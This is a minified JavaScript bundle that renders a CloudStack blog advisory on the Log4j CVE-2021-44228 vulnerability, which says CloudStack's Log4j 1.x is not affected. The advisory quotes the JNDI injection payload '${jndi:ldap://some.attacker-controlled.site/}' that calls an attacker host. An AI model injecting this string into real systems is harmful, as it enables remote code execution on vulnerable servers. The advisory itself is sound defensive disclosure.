"use strict";(self.webpackChunkwebsite=self.webpackChunkwebsite||[]).push([[2607],{3905:(e,t,r)=>{r.d(t,{Zo:()=>u,kt:()=>m});var n=r(67294);function o(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function a(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),r.push.apply(r,n)}return r}function i(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?a(Object(r),!0).forEach((function(t){o(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):a(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}function l(e,t){if(null==e)return{};var r,n,o=function(e,t){if(null==e)return{};var r,n,o={},a=Object.keys(e);for(n=0;n<a.length;n++)r=a[n],t.indexOf(r)>=0||(o[r]=e[r]);return o}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(n=0;n<a.length;n++)r=a[n],t.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(o[r]=e[r])}return o}var c=n.createContext({}),s=function(e){var t=n.useContext(c),r=t;return e&&(r="function"==typeof e?e(t):i(i({},t),e)),r},u=function(e){var t=s(e.components);return n.createElement(c.Provider,{value:t},e.children)},p="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},g=n.forwardRef((function(e,t){var r=e.components,o=e.mdxType,a=e.originalType,c=e.parentName,u=l(e,["components","mdxType","originalType","parentName"]),p=s(r),g=o,m=p["".concat(c,".").concat(g)]||p[g]||d[g]||a;return r?n.createElement(m,i(i({ref:t},u),{},{components:r})):n.createElement(m,i({ref:t},u))}));function m(e,t){var r=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var a=r.length,i=new Array(a);i[0]=g;var l={};for(var c in t)hasOwnProperty.call(t,c)&&(l[c]=t[c]);l.originalType=e,l[p]="string"==typeof e?e:o,i[1]=l;for(var s=2;s<a;s++)i[s]=r[s];return n.createElement.apply(null,i)}return n.createElement.apply(null,r)}g.displayName="MDXCreateElement"},15886:(e,t,r)=>{r.r(t),r.d(t,{assets:()=>c,contentTitle:()=>i,default:()=>d,frontMatter:()=>a,metadata:()=>l,toc:()=>s});var n=r(87462),o=(r(67294),r(3905));const a={layout:"post",title:"CloudStack Advisory on Apache Log4j Zero Day (CVE-2021-44228)",tags:["announcement"],authors:["rohit"],slug:"log4jshell"},i=void 0,l={permalink:"/blog/log4jshell",source:"@site/blog/2021-12-13-log4jshell.md",title:"CloudStack Advisory on Apache Log4j Zero Day (CVE-2021-44228)",description:"On 9th December 2021, a new zero-day vulnerability for Apache Log4j was reported. It is by now tracked under CVE-2021-44228:",date:"2021-12-13T00:00:00.000Z",formattedDate:"December 13, 2021",tags:[{label:"announcement",permalink:"/blog/tags/announcement"}],hasTruncateMarker:!0,authors:[{name:"Rohit Yadav",title:"PMC Member",url:"https://github.com/rohityadavcloud",imageURL:"https://github.com/rohityadavcloud.png",key:"rohit"}],frontMatter:{layout:"post",title:"CloudStack Advisory on Apache Log4j Zero Day (CVE-2021-44228)",tags:["announcement"],authors:["rohit"],slug:"log4jshell"},prevItem:{title:"Meet the Community - Pearl Dsilva",permalink:"/blog/meet-the-community-pearl-dsilva"},nextItem:{title:"IKOULA Simplifies the Management of Large-Scale Cloud Infrastructure with CloudStack and XCP-ng",permalink:"/blog/case-study-ikoula-xcpng-cloudstack"}},c={authorsImageUrls:[void 0]},s=[],u={toc:s},p="wrapper";function d(e){let{components:t,...r}=e;return(0,o.kt)(p,(0,n.Z)({},u,r,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("p",null,"On 9th December 2021, a new zero-day vulnerability for Apache Log4j was reported. It is by now tracked under CVE-2021-44228:"),(0,o.kt)("a",{href:"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"},"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"),".",(0,o.kt)("p",null,'CVE-2021-44228 vulnerability is classified under the highest severity mark and allows an attacker to execute arbitrary code by injecting a sub-string in the form "${jndi:ldap://some.attacker-controlled.site/}" into a logged message. Apache Log4j 2.x is reported to be affected as it performs a lookup (string substitution) using the JNDI protocol, whenever the "${jndi:...}" string is found within a message parameter.'),(0,o.kt)("p",null,"The Apache ",(0,o.kt)("a",{href:"https://github.com/apache/logging-log4j2/pull/608#issuecomment-990494126"},"Log4j developers")," and the ",(0,o.kt)("a",{href:"http://slf4j.org/log4shell.html"},"SLF4J project advisory")," confirm that Apache Log4j 1.x does not offer a look-up mechanism and does not suffer remote code execution (RCE) vulnerability from CVE-2021-44228."),(0,o.kt)("p",null,"All Apache CloudStack releases since v4.6 use Apache Log4j version 1.2.17 and therefore are not affected by this RCE vulnerability. Most users who haven't changed the default log4j xml config don't need to do anything, advanced users can check and fix their log4j xml configuration if they're using any custom JMS appenders."),(0,o.kt)("p",null,"The Apache CloudStack project will consider migrating to a different version of Apache Log4j in future releases."))}d.isMDXComponent=!0}}]);